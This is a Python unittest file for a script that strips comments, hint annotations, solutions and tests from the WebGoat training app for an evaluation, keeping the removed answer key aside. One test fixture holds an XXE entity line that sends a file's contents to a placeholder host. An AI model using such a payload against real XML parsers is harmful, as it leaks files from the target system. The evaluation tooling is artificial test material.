"""Behavior tests for evals/webgoat/scrub_webgoat.py. Run: python3 -m unittest discover tests"""

import sys
import tempfile
import unittest
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT / "evals" / "webgoat"))

import scrub_webgoat as sw  # noqa: E402


def write(root: Path, rel: str, text: str) -> None:
    path = root / rel
    path.parent.mkdir(parents=True, exist_ok=True)
    with path.open("w", encoding="utf-8", newline="") as handle:
        handle.write(text)


class StripJava(unittest.TestCase):
    """Lesson sources keep their code and lose every comment and hint annotation."""

    def test_line_comments_go_but_urls_inside_strings_stay(self) -> None:
        src = 'String u = "http://x/y"; // trailing note\n// full line\nint a = 1;\n'
        self.assertEqual(sw.strip_java(src), 'String u = "http://x/y";\nint a = 1;\n')

    def test_block_and_javadoc_comments_go_but_string_contents_stay(self) -> None:
        src = (
            "/** doc */\npublic class A {\n"
            "  /* secure code would check here */\n"
            '  String s = "/* keep */";\n}\n'
        )
        self.assertEqual(sw.strip_java(src), 'public class A {\n  String s = "/* keep */";\n}\n')

    def test_text_blocks_survive_untouched(self) -> None:
        dtd = (
            'String dtd = """\n'
            "<!ENTITY send SYSTEM 'http://host/landing?text=%file;'>\n"
            '""";\n'
        )
        self.assertEqual(sw.strip_java(dtd), dtd)
        # An odd number of quotes inside the block would leave `//` in code state
        # if the block were tokenised as ordinary strings.
        unbalanced = 'String q = """\n  say "hi // not a comment\n  """;\n'
        self.assertEqual(sw.strip_java(unbalanced), unbalanced)

    def test_char_literal_quote_does_not_open_a_string(self) -> None:
        src = "char q = '\"'; // note\nint b = 2;\n"
        self.assertEqual(sw.strip_java(src), "char q = '\"';\nint b = 2;\n")

    def test_assignment_hints_annotation_is_removed_in_both_forms(self) -> None:
        braces = '@RestController\n@AssignmentHints({\n  "idor.hints.one",\n  "idor.hints.two"\n})\npublic class A {}\n'
        self.assertEqual(sw.strip_java(braces), "@RestController\npublic class A {}\n")
        value = '@AssignmentHints(\n    value = {"a-1", "a-2"})\npublic class B {}\n'
        self.assertEqual(sw.strip_java(value), "public class B {}\n")

    def test_import_of_the_hints_annotation_is_removed(self) -> None:
        src = "import org.owasp.webgoat.container.assignments.AssignmentHints;\nimport x.Y;\n"
        self.assertEqual(sw.strip_java(src), "import x.Y;\n")

    def test_crlf_files_keep_their_line_endings(self) -> None:
        src = "int a = 1; // note\r\n// gone\r\nint b = 2;\r\n"
        self.assertEqual(sw.strip_java(src), "int a = 1;\r\nint b = 2;\r\n")


class Scrub(unittest.TestCase):
    """The copy loses the answer key; the key directory keeps what was removed."""

    def test_removes_answer_key_material_and_saves_it_beside_the_copy(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp) / "webgoat"
            key = Path(tmp) / "key"
            write(root, "AGENTS.md", "map")
            write(root, "src/it/java/X.java", "it")
            write(root, "src/test/java/Y.java", "test")
            write(root, "src/main/resources/lessons/idor/documentation/IDOR_intro.adoc", "solution")
            write(root, "src/main/resources/lessons/idor/i18n/WebGoatLabels.properties", "idor.hints.1=Append your id")
            write(root, "src/main/resources/lessons/spoofcookie/lessonSolutions/html/S.html", "sol")
            write(root, "src/main/resources/lessons/sol.MD", "answers")
            write(root, "src/main/resources/lessons/idor/html/IDOR.html", "<div><!-- hint: tamper the id -->x</div>")
            write(root, "src/main/resources/lessons/idor/js/idor.js", "// keep js as is\n")
            write(
                root,
                "src/main/java/org/owasp/webgoat/lessons/idor/IDOR.java",
                '@AssignmentHints({"a"})\npublic class IDOR {\n  // secure code would check ownership\n  int x = 1;\n}\n',
            )
            write(root, "src/main/java/org/owasp/webgoat/lessons/idor/Keep.java", "public class Keep {}\n")
            write(root, "src/main/java/org/owasp/webgoat/container/C.java", "// container comment stays\npublic class C {}\n")
            write(root, ".git/HEAD", "ref")

            summary = sw.scrub(root, key)

            for rel in [
                "AGENTS.md",
                "src/it",
                "src/test",
                "src/main/resources/lessons/idor/documentation",
                "src/main/resources/lessons/idor/i18n",
                "src/main/resources/lessons/spoofcookie/lessonSolutions",
                "src/main/resources/lessons/sol.MD",
                ".git",
            ]:
                self.assertFalse((root / rel).exists(), rel)
            self.assertEqual((key / "AGENTS.md").read_text(encoding="utf-8"), "map")
            self.assertEqual(
                (key / "src/main/resources/lessons/idor/i18n/WebGoatLabels.properties").read_text(encoding="utf-8"),
                "idor.hints.1=Append your id",
            )
            self.assertFalse((key / ".git").exists())
            self.assertEqual(
                (root / "src/main/java/org/owasp/webgoat/lessons/idor/IDOR.java").read_text(encoding="utf-8"),
                "public class IDOR {\n  int x = 1;\n}\n",
            )
            self.assertEqual(
                (root / "src/main/java/org/owasp/webgoat/container/C.java").read_text(encoding="utf-8"),
                "// container comment stays\npublic class C {}\n",
            )
            self.assertEqual(
                (root / "src/main/resources/lessons/idor/html/IDOR.html").read_text(encoding="utf-8"), "<div>x</div>"
            )
            self.assertEqual(
                (root / "src/main/resources/lessons/idor/js/idor.js").read_text(encoding="utf-8"), "// keep js as is\n"
            )
            self.assertEqual(summary["java_files_changed"], 1)
            self.assertEqual(summary["html_files_changed"], 1)
            self.assertIn("src/it", summary["removed"])


if __name__ == "__main__":
    unittest.main()
